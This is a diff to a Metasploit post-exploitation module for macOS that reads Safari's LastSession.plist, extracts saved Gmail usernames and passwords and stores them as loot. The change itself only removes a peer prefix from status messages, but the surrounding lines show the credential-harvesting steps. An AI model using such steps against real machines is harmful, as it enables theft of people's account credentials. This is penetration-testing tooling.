@@ -45,7 +45,7 @@ class MetasploitModule < Msf::Post
   # @return [String] The Safari version. If not found, returns ''
   #
   def get_safari_version
-    vprint_status("#{peer} - Checking Safari version.")
+    vprint_status("Checking Safari version.")
     version = ''
 
     f = read_file('/Applications/Safari.app/Contents/version.plist')
@@ -81,7 +81,7 @@ class MetasploitModule < Msf::Post
   # Just a wrapper for plutil
   #
   def get_lastsession
-    print_status("#{peer} - Looking for LastSession.plist")
+    print_status("Looking for LastSession.plist")
     plutil("#{expand_path('~')}/Library/Safari/LastSession.plist")
   end
 
@@ -147,7 +147,7 @@ class MetasploitModule < Msf::Post
   # @return [Array] [0] is the domain, [1] is the user, [2] is the pass
   #
   def find_gmail_cred(xml)
-    vprint_status("#{peer} - Looking for username/password for Gmail.")
+    vprint_status("Looking for username/password for Gmail.")
     gmail_dict = get_session_element(xml, /(mail|accounts)\.google\.com/)
     return '' if gmail_dict.nil?
 
@@ -176,12 +176,12 @@ class MetasploitModule < Msf::Post
     #
     lastsession = get_lastsession
     if lastsession.blank?
-      print_error("#{peer} - LastSession.plist not found")
+      print_error("LastSession.plist not found")
       return
     end
 
     p = store_loot('osx.lastsession.plist', 'text/plain', session, lastsession, 'LastSession.plist.xml')
-    print_good("#{peer} - LastSession.plist stored in: #{p}")
+    print_good("LastSession.plist stored in: #{p}")
 
 #
 # If this is an unpatched version, we try to extract creds
@@ -191,10 +191,10 @@ class MetasploitModule < Msf::Post
     if version.blank?
       print_warning("Unable to determine Safari version, will try to extract creds anyway")
     elsif version >= "6.1"
-      print_status("#{peer} - This machine no longer stores session data in plain text")
+      print_status("This machine no longer stores session data in plain text")
       return
     else
-      vprint_status("#{peer} - Safari version: #{version}")
+      vprint_status("Safari version: #{version}")
     end
 =end
 
@@ -218,7 +218,7 @@ class MetasploitModule < Msf::Post
 
     unless cred_tbl.rows.empty?
       p = store_loot('osx.lastsession.creds', 'text/plain', session, cred_tbl.to_csv, 'LastSession_creds.txt')
-      print_good("#{peer} - Found credential saved in: #{p}")
+      print_good("Found credential saved in: #{p}")
       print_line
       print_line(cred_tbl.to_s)
     end
